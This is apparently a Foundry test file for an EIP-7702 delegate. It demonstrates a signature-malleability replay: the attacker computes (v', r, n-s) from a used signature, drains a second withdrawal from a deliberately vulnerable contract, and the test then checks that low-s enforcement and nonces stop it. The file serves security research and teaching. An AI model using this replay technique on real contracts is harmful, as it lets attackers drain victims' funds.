// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/vulnerable/DC08_MalleableDelegate.sol";
import "../src/fixed/DC08_SafeDelegate.sol";

/**
 * @title DC08_SigMalleabilityTest
 * @notice PoC tests for DC-08: Signature malleability
 * @author Aditya Chotaliya [adityachotaliya.xyz]
 *

 */
contract DC08_SigMalleabilityTest is Test {
    address payable public victimEOA;
    uint256 public victimKey;
    address public attacker;
    address payable public recipient;

    DC08_MalleableDelegate public vulnDelegate;
    DC08_SafeDelegate      public safeDelegate;

    // secp256k1 curve order
    uint256 constant SECP256K1_N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function setUp() public {
        victimKey = 0xC0FFEE;
        victimEOA = payable(vm.addr(victimKey));
        attacker  = makeAddr("attacker");
        recipient = payable(makeAddr("recipient"));

        vm.deal(victimEOA, 10 ether);

        vulnDelegate = new DC08_MalleableDelegate();
        safeDelegate = new DC08_SafeDelegate();
    }

    // =========================================================================
    // RED TESTS - signature malleability bypass
    // =========================================================================

    /**
     * @notice RED: Malleable signature bypasses the "already used" check
     *
     * 1. Victim signs a withdraw(recipient, 1 ETH)
     * 2. Signature (v, r, s) is used legitimately → marked as used
     * 3. Attacker computes (v', r, n-s) — the malleable form
     * 4. keccak256(malleable_sig) != keccak256(original_sig)
     * 5. usedSignatures[malleable_sig_hash] == false → replay succeeds
     */
    function test_RED_MalleableSigBypassesUsedCheck() public {
        console.log("=== DC-08 SIGNATURE MALLEABILITY EXPLOIT ===");

        _etch7702(victimEOA, address(vulnDelegate));
        vm.prank(victimEOA);
        DC08_MalleableDelegate(victimEOA).initialize(victimEOA);

        // Victim signs withdraw(recipient, 1 ETH)
        bytes32 digest = _buildVulnDigest(recipient, 1 ether);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, digest);
        bytes memory originalSig = abi.encodePacked(r, s, v);

        console.log("Original signature v:", v);
        console.logBytes32(s);

        // Legitimate withdrawal - marks originalSig as used
        DC08_MalleableDelegate(victimEOA).withdraw(recipient, 1 ether, originalSig);
        assertEq(recipient.balance, 1 ether, "First withdrawal succeeded");
        assertTrue(DC08_MalleableDelegate(victimEOA).isSignatureUsed(originalSig), "Original sig marked used");

        console.log("First withdrawal done. Original sig marked used.");
        console.log("Computing malleable form...");

        // Compute malleable form: (v', r, n-s)
        uint8  mallV = v == 27 ? 28 : 27;
        bytes32 mallS = bytes32(SECP256K1_N - uint256(s));
        bytes memory malleableSig = abi.encodePacked(r, mallS, mallV);

        console.log("Malleable v:", mallV);
        console.logBytes32(mallS);

        // Verify the malleable sig is NOT marked as used (different bytes)
        assertFalse(
            DC08_MalleableDelegate(victimEOA).isSignatureUsed(malleableSig),
            "Malleable sig is NOT in usedSignatures"
        );

        // Replay with malleable form - SUCCEEDS because usedSigs[malleableHash] == false
        vm.prank(attacker);
        DC08_MalleableDelegate(victimEOA).withdraw(recipient, 1 ether, malleableSig);

        assertEq(recipient.balance, 2 ether, "REPLAY: 2 ETH withdrawn with one signing!");
        assertEq(DC08_MalleableDelegate(victimEOA).getTotalWithdrawn(), 2 ether, "2 ETH total drained");

        console.log("REPLAY SUCCESS: 2 ETH drained from one victim signature!");
        console.log("Victim ETH remaining:", victimEOA.balance / 1e18, "ETH");
    }

    /**
     * @notice RED: Verify both sig forms recover to the same signer
     *
     * Proves the mathematical foundation of the attack.
     */
    function test_RED_BothFormsRecoverSameSigner() public view {
        bytes32 digest = _buildVulnDigest(recipient, 1 ether);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, digest);

        // Compute malleable form
        uint8   mallV = v == 27 ? 28 : 27;
        bytes32 mallS = bytes32(SECP256K1_N - uint256(s));

        address signerOriginal  = ecrecover(digest, v, r, s);
        address signerMalleable = ecrecover(digest, mallV, r, mallS);

        console.log("=== DC-08 MATH PROOF ===");
        console.log("Original signer: ", signerOriginal);
        console.log("Malleable signer:", signerMalleable);
        console.log("Victim EOA:      ", victimEOA);

        assertEq(signerOriginal, signerMalleable, "Both forms recover same address");
        assertEq(signerOriginal, victimEOA, "Recovered signer is victim");
        assertTrue(
            keccak256(abi.encodePacked(r, s, v)) != keccak256(abi.encodePacked(r, mallS, mallV)),
            "But sig bytes are different - bypass works"
        );
    }

    // =========================================================================
    // GREEN TESTS - lower-s enforcement and nonce block malleability
    // =========================================================================

    /**
     * @notice GREEN: Malleable sig REJECTED by safe delegate (high-s check)
     */
    function test_GREEN_HighSRejectedBySafeDelegate() public {
        console.log("=== DC-08 FIXED: Lower-s Enforcement ===");

        _etch7702(victimEOA, address(safeDelegate));
        vm.prank(victimEOA);
        DC08_SafeDelegate(victimEOA).initialize(victimEOA);

        bytes32 digest = _buildSafeDigest(recipient, 1 ether, 0);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, digest);

        // Forge-std always produces low-s signatures, so create the high-s form
        uint8   highV = v == 27 ? 28 : 27;
        bytes32 highS = bytes32(SECP256K1_N - uint256(s));

        // If original s is already high (rare), swap
        bytes memory lowSig;
        bytes memory highSig;
        if (uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
            lowSig  = abi.encodePacked(r, s, v);
            highSig = abi.encodePacked(r, highS, highV);
        } else {
            highSig = abi.encodePacked(r, s, v);
            lowSig  = abi.encodePacked(r, highS, highV);
        }

        // High-s signature is REJECTED
        vm.expectRevert("DC08: high-s rejected");
        DC08_SafeDelegate(victimEOA).withdraw(recipient, 1 ether, 0, highSig);

        console.log("High-s signature rejected.");

        // Low-s signature WORKS
        DC08_SafeDelegate(victimEOA).withdraw(recipient, 1 ether, 0, lowSig);
        assertEq(recipient.balance, 1 ether, "Legitimate low-s withdrawal succeeded");
        assertEq(DC08_SafeDelegate(victimEOA).getNonce(), 1, "Nonce incremented");

        console.log("Low-s withdrawal succeeded. Nonce now:", DC08_SafeDelegate(victimEOA).getNonce());
    }

    /**
     * @notice GREEN: Even with low-s sig, replay fails because nonce incremented
     */
    function test_GREEN_NonceBlocksReplayAfterUse() public {
        _etch7702(victimEOA, address(safeDelegate));
        vm.prank(victimEOA);
        DC08_SafeDelegate(victimEOA).initialize(victimEOA);

        uint256 nonce = 0;
        bytes32 digest = _buildSafeDigest(recipient, 1 ether, nonce);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        // First use - succeeds
        DC08_SafeDelegate(victimEOA).withdraw(recipient, 1 ether, nonce, sig);
        assertEq(recipient.balance, 1 ether, "First withdrawal OK");

        // Replay with same sig and nonce - fails
        vm.prank(attacker);
        vm.expectRevert("DC08: invalid nonce");
        DC08_SafeDelegate(victimEOA).withdraw(recipient, 1 ether, nonce, sig);

        assertEq(recipient.balance, 1 ether, "No double withdrawal - nonce blocked replay");
        console.log("=== Nonce prevents replay even with valid signature ===");
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    function _etch7702(address eoa, address delegate) internal {
        vm.etch(eoa, delegate.code);
    }

    function _buildVulnDigest(address payable to, uint256 amount) internal view returns (bytes32) {
        bytes32 DT = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");
        bytes32 WT = keccak256("Withdraw(address to,uint256 amount)");
        bytes32 dom = keccak256(abi.encode(DT, keccak256("WithdrawDelegate"), block.chainid, address(victimEOA)));
        bytes32 str = keccak256(abi.encode(WT, to, amount));
        return keccak256(abi.encodePacked("\x19\x01", dom, str));
    }

    function _buildSafeDigest(address payable to, uint256 amount, uint256 nonce) internal view returns (bytes32) {
        bytes32 DT = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");
        bytes32 WT = keccak256("Withdraw(address to,uint256 amount,uint256 nonce)");
        bytes32 dom = keccak256(abi.encode(DT, keccak256("WithdrawDelegate"), block.chainid, address(victimEOA)));
        bytes32 str = keccak256(abi.encode(WT, to, amount, nonce));
        return keccak256(abi.encodePacked("\x19\x01", dom, str));
    }
}
